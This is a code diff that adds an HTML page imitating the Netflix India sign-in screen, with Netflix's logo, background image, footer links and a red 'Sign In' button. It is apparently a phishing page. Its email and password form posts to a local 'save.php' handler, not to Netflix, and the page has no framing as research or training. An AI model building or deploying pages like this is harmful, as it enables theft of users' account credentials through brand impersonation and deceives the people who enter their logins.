@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Sign In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        /* Base font for the body */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #141414; /* Dark background fallback */
+            /* Using the provided background image URL with a dark overlay */
+            background-image: linear-gradient(rgb(0 0 0 / 49%), rgb(0 0 0 / 56%)), url(https://assets.nflxext.com/ffe/siteui/vlv3/914ad279-199e-4095-9c10-2409dc9e5e1b/web/IN-en-20250519-TRIFECTA-perspective_8f1ca896-9e49-4a4e-90f0-22fc49650bd9_small.jpg);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed; /* Keep background fixed when scrolling */
+        }
+
+        /* Custom styles for the checkbox to match Netflix's style more closely */
+        .form-checkbox {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            display: inline-block;
+            height: 1rem; /* 16px */
+            width: 1rem; /* 16px */
+            border-radius: 0.125rem; /* 2px, very subtle */
+            border-width: 1px;
+            border-color: #737373; /* Slightly lighter gray for border */
+            background-color: #333; /* Darker background for checkbox */
+            vertical-align: middle;
+            cursor: pointer;
+            position: relative;
+            flex-shrink: 0; /* Prevent shrinking in flex container */
+        }
+        .form-checkbox:checked {
+            background-color: #737373; /* Gray-700 when checked */
+            border-color: #737373; /* Gray-700 when checked */
+        }
+        .form-checkbox:checked::before {
+            content: '\2713'; /* Checkmark unicode character */
+            display: block;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff; /* White checkmark */
+            font-size: 0.75rem; /* text-xs */
+            line-height: 1;
+        }
+        .form-checkbox:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.5); /* Subtle white focus ring */
+        }
+
+        /* Custom style for the 'OR' separator line */
+        .or-separator {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #737373; /* Gray text */
+            font-size: 0.875rem; /* text-sm */
+            margin-top: 1.5rem; /* mt-6 */
+            margin-bottom: 1.5rem; /* mb-6 */
+        }
+        .or-separator::before,
+        .or-separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #737373; /* Gray line */
+        }
+        .or-separator:not(:empty)::before {
+            margin-right: .5em;
+        }
+        .or-separator:not(:empty)::after {
+            margin-left: .5em;
+        }
+
+        /* Specific styling for the language dropdown */
+        .language-select-wrapper {
+            position: relative;
+            display: inline-block;
+        }
+        .language-select {
+            background-color: #000;
+            border: 1px solid #737373;
+            color: #737373;
+            padding: 0.75rem 2.5rem 0.75rem 0.75rem; /* Adjusted padding for taller dropdown */
+            border-radius: 0.25rem;
+            -webkit-appearance: none; /* Remove default arrow */
+            -moz-appearance: none; /* Remove default arrow */
+            appearance: none; /* Remove default arrow */
+            cursor: pointer;
+            font-size: 0.875rem; /* text-sm */
+        }
+        .language-select-wrapper::after {
+            content: '▼'; /* Custom dropdown arrow */
+            font-size: 0.75rem;
+            color: #737373;
+            position: absolute;
+            right: 0.75rem;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none; /* Allow clicks to pass through to select */
+        }
+
+        /* Adjustments for the form container to match the image's opacity and padding */
+        .login-form-container {
+            background-color: rgba(0, 0, 0, 0.6); /* Match image opacity */
+            padding: 4.25rem; /* Fine-tuned padding */
+            border-radius: 0.25rem; /* Subtle rounding */
+            box-shadow: none; /* No shadow */
+            margin-top: 5rem;
+        }
+
+        /* Input field styling */
+        .login-input {
+            background-color: #333; /* Darker input background */
+            color: #fff;
+            padding: 1.125rem 1.25rem; /* Taller inputs: ~18px vertical padding */
+            border-radius: 0.25rem;
+            border: none; /* No border */
+            font-size: 1rem; /* Default font size */
+        }
+        .login-input::placeholder {
+            color: #8c8c8c; /* Lighter placeholder text */
+        }
+        .login-input:focus {
+            outline: none;
+            background-color: #454545; /* Slightly lighter on focus */
+        }
+
+        /* Button styling */
+        .login-button {
+            background-color: #e50914; /* Netflix red */
+            color: #fff;
+            font-weight: 600; /* semibold */
+            padding: 1rem 1.25rem; /* py-4 px-5 for a taller button */
+            border-radius: 0.25rem;
+            transition: background-color 0.2s ease-in-out;
+            font-size: 1rem;
+        }
+        .login-button:hover {
+            background-color: #f40612; /* Slightly darker red on hover */
+        }
+
+        /* Footer specific adjustments */
+        .footer-section {
+            background-color: rgb(20, 20, 20); /* Closer to solid black as per image */
+            padding-top: 4rem; /* Increased padding */
+            padding-bottom: 4rem; /* Increased padding */
+        }
+        .footer-link {
+            color: #737373; /* Lighter gray for links */
+            font-size: 0.8125rem; /* Slightly smaller font size (13px) */
+        }
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Netflix Logo SVG styling */
+        .netflix-logo-svg {
+            fill: #e50914; /* Netflix red */
+            height: 2.2rem; /* Adjust height to match visual size of original logo */
+            width: auto; /* Maintain aspect ratio */
+        }
+        .netflix-logo {
+            padding-left: 10rem;
+        }
+    </style>
+</head>
+<body class="font-sans">
+    <div class="min-h-screen flex flex-col items-center justify-center">
+        <div class="absolute top-0 left-0 pt-6 z-10 netflix-logo">
+            <svg class="netflix-logo-svg" viewBox="0 0 111 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" fill="#e50914"/>
+            </svg>
+        </div>
+
+        <div class="login-form-container max-w-md w-full mx-auto">
+            <h1 class="text-white text-3xl font-bold mb-7 text-left">Sign In</h1>
+
+            <form id="loginForm" action="save.php" method="POST">
+                <div class="mb-4">
+                    <input
+                        type="email"
+                        id="email"
+                        name="email"
+                        placeholder="Email or mobile number"
+                        class="login-input w-full"
+                        required
+                    />
+                </div>
+
+                <div class="mb-4">
+                    <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        placeholder="Password"
+                        class="login-input w-full"
+                        required
+                    />
+                </div>
+
+                <button
+                    type="submit"
+                    class="login-button w-full mt-4"
+                >
+                    Sign In
+                </button>
+            </form>
+
+            <div class="or-separator">OR</div>
+
+            <button
+                type="button"
+                class="w-full bg-gray-600 hover:bg-gray-700 text-white font-medium py-3 px-5 rounded-md transition duration-200 text-sm mt-0"
+            >
+                Use a sign-in code
+            </button>
+
+            <div class="flex justify-between items-center mt-4 text-sm">
+                <label class="flex items-center cursor-pointer text-gray-400">
+                    <input
+                        type="checkbox"
+                        id="rememberMe"
+                        name="rememberMe"
+                        class="form-checkbox"
+                    />
+                    <span class="ml-2 text-gray-400">Remember me</span>
+                </label>
+                <a href="#" class="text-gray-400 hover:underline text-sm">Forgot password?</a>
+            </div>
+
+            <div class="mt-12 text-center text-gray-400">
+                <p class="mb-4">
+                    <span class="text-gray-400">New to Netflix?</span>
+                    <a href="#" class="text-white hover:underline ml-1">Sign up now</a>.
+                </p>
+                <p class="text-xs leading-tight">
+                    This page is protected by Google reCAPTCHA to ensure you're not a bot.
+                    <a href="#" class="text-blue-500 hover:underline ml-1">Learn more.</a>
+                </p>
+            </div>
+        </div>
+
+        <div class="w-full footer-section mt-24">
+            <div class="max-w-md mx-auto px-4">
+                <p class="mb-6 text-gray-400">Questions? Call <a href="#" class="hover:underline text-gray-400">000-800-919-1743 (Toll-Free)</a></p>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+                    <a href="#" class="footer-link">FAQ</a>
+                    <a href="#" class="footer-link">Help Centre</a>
+                    <a href="#" class="footer-link">Terms of Use</a>
+                    <a href="#" class="footer-link">Privacy</a>
+                    <a href="#" class="footer-link">Cookie Preferences</a>
+                    <a href="#" class="footer-link">Corporate Information</a>
+                </div>
+                <div class="language-select-wrapper mb-6">
+                    <select class="language-select">
+                        <option value="en">English</option>
+                        <option value="hi">हिन्दी</option>
+                    </select>
+                </div>
+                <p class="text-xs text-gray-400">Netflix India</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // No client-side JavaScript for form submission needed here,
+        // as the form's 'action' attribute will direct the submission to 'login.php'.
+    </script>
+</body>
+</html>
